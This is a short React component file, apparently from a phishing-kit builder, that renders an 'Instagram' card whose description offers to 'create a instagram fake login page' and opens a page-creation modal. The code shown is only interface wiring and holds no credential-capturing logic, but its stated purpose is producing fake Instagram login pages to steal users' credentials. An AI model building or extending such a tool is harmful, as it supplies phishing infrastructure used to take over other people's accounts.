import Card from "../../../../shared/components/ui/card";
import { useState } from "react";
import AddInstagramPage from "./add-instagram-page";

const InstagramCard = () => {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <>
      <Card
        title="Instagram"
        decription="you can create a instagram fake login page by clicking here"
        imageURL="../../../../../public/covers/instagram-cover.jpg"
        onClick={() => setIsOpen(true)}
      />
      <AddInstagramPage isOpen={isOpen} setIsOpen={setIsOpen} />
    </>
  );
};

export default InstagramCard;
